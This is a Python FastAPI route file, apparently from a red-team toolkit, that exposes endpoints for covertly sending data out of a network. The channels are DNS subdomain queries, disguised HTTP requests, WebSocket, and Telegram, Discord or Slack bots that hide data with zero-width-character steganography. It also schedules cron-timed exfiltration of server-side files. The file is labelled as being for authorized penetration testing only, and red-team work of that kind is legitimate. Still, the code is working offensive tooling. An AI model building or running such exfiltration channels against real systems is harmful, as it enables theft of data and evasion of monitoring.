"""
Routes /api/exfil — Exfiltration via Covert Channels (Module 23).

ALL endpoints are for authorized penetration testing / red team operations only.
JWT-protected via the main router.
"""
from __future__ import annotations

import base64
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, Query
from pydantic import BaseModel, Field, field_validator
from sqlalchemy.orm import Session

from database.db import get_db
from core.engines.exfil_engine import ExfilEngine

router = APIRouter()
_engine = ExfilEngine()


# ── Request models ─────────────────────────────────────────────────────────────

class DnsExfilRequest(BaseModel):
    data_b64: str = Field(..., description="Base64-encoded data to exfiltrate")
    domain: str = Field(..., description="Target domain for DNS queries")
    dns_server: str = Field("8.8.8.8", description="DNS resolver IP")
    encrypt: bool = Field(True, description="Compress + encrypt before exfil")

    @field_validator("data_b64")
    @classmethod
    def _validate_b64(cls, v: str) -> str:
        try:
            base64.b64decode(v)
        except Exception:
            raise ValueError("data_b64 must be valid base64")
        return v


class HttpExfilRequest(BaseModel):
    data_b64: str
    endpoint: str = Field(..., description="HTTP endpoint URL")
    method: str = Field("POST", description="GET | POST | PUT")
    disguise: str = Field(
        "json",
        description="json | form | base64_img | cookie",
    )
    encrypt: bool = True

    @field_validator("method")
    @classmethod
    def _method(cls, v: str) -> str:
        return v.upper()

    @field_validator("disguise")
    @classmethod
    def _disguise(cls, v: str) -> str:
        allowed = {"json", "form", "base64_img", "cookie"}
        if v not in allowed:
            raise ValueError(f"disguise must be one of {allowed}")
        return v


class WebSocketExfilRequest(BaseModel):
    data_b64: str
    ws_url: str = Field(..., description="WebSocket URL (ws:// or wss://)")
    encrypt: bool = True


class SocialExfilRequest(BaseModel):
    data_b64: str
    platform: str = Field(..., description="telegram | discord | slack")
    api_key: str = Field(..., description="Bot token / webhook URL / OAuth token")
    channel: str = Field(..., description="Chat ID / channel ID / webhook URL")
    encrypt: bool = True

    @field_validator("platform")
    @classmethod
    def _platform(cls, v: str) -> str:
        allowed = {"telegram", "discord", "slack"}
        if v not in allowed:
            raise ValueError(f"platform must be one of {allowed}")
        return v


class ChannelTestRequest(BaseModel):
    config: dict = Field(default_factory=dict, description="Channel-specific config")


class ScheduleExfilRequest(BaseModel):
    data_path: str = Field(..., description="Server-side path to data file")
    channel: str = Field(..., description="dns | icmp | http | websocket | telegram | discord | slack")
    cron_expr: str = Field(..., description="5-field cron expression (min hour dom month dow)")
    config: dict = Field(default_factory=dict)
    encrypt: bool = True


# ── Helper ─────────────────────────────────────────────────────────────────────

async def _decode_and_optionally_encrypt(
    data_b64: str,
    encrypt: bool,
) -> bytes:
    """Decode base64 data and optionally compress+encrypt."""
    try:
        raw = base64.b64decode(data_b64)
    except Exception as exc:
        raise HTTPException(status_code=400, detail=f"Invalid base64: {exc}")

    if encrypt:
        raw = await _engine.compress_and_encrypt(raw)
    return raw


# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.post("/dns")
async def exfiltrate_dns(
    req: DnsExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Exfiltrate data via DNS subdomain queries.
    Data is base32-encoded and split into 55-char DNS labels.
    """
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_dns(data, req.domain, req.dns_server)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    result["compressed"] = req.encrypt
    await _engine._persist_job(result, "dns", len(data), db)
    return result


@router.post("/http")
async def exfiltrate_http(
    req: HttpExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Exfiltrate data via HTTP.
    Supports json / form / base64_img / cookie disguise modes.
    """
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_http(
            data, req.endpoint, req.method, req.disguise
        )
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    await _engine._persist_job(result, "http", len(data), db)
    return result


@router.post("/websocket")
async def exfiltrate_websocket(
    req: WebSocketExfilRequest,
    db: Session = Depends(get_db),
):
    """Exfiltrate data via WebSocket connection."""
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_websocket(data, req.ws_url)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    await _engine._persist_job(result, "websocket", len(data), db)
    return result


@router.post("/social")
async def exfiltrate_social(
    req: SocialExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Exfiltrate data via social platform APIs.
    Uses zero-width character steganography to hide data in normal-looking messages.
    """
    data = await _decode_and_optionally_encrypt(req.data_b64, req.encrypt)
    try:
        result = await _engine.exfiltrate_social(
            data, req.platform, req.api_key, req.channel
        )
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    result["encrypted"] = req.encrypt
    await _engine._persist_job(result, req.platform, len(data), db)
    return result


@router.post("/test/{channel}")
async def test_channel(
    channel: str,
    req: ChannelTestRequest,
    db: Session = Depends(get_db),
):
    """
    Test if an exfil channel is functional without sending real data.
    Sends a small test payload.
    """
    valid_channels = {"dns", "http", "icmp", "websocket", "telegram", "discord", "slack"}
    if channel not in valid_channels:
        raise HTTPException(
            status_code=400,
            detail=f"Unknown channel '{channel}'. Valid: {valid_channels}",
        )
    try:
        result = await _engine.test_channel(channel, req.config)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))
    return result


@router.post("/schedule")
async def schedule_exfil(
    req: ScheduleExfilRequest,
    db: Session = Depends(get_db),
):
    """
    Schedule exfiltration at a specific time using cron expression.
    The server-side data_path file will be exfiltrated at the scheduled time.
    """
    try:
        exfil_id = await _engine.schedule_exfil(
            data_path=req.data_path,
            channel=req.channel,
            cron_expr=req.cron_expr,
            config={**req.config, "encrypt": req.encrypt},
            db=db,
        )
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))

    return {
        "exfil_id": exfil_id,
        "channel": req.channel,
        "cron_expr": req.cron_expr,
        "data_path": req.data_path,
        "status": "scheduled",
    }


@router.get("/jobs")
async def list_jobs(
    db: Session = Depends(get_db),
):
    """List all exfiltration jobs."""
    try:
        return await _engine.list_jobs(db)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@router.get("/job/{exfil_id}")
async def get_job(
    exfil_id: str,
    db: Session = Depends(get_db),
):
    """Get status and details of a specific exfil job."""
    result = await _engine.get_job(exfil_id, db)
    if result is None:
        raise HTTPException(status_code=404, detail=f"Exfil job {exfil_id} not found")
    return result
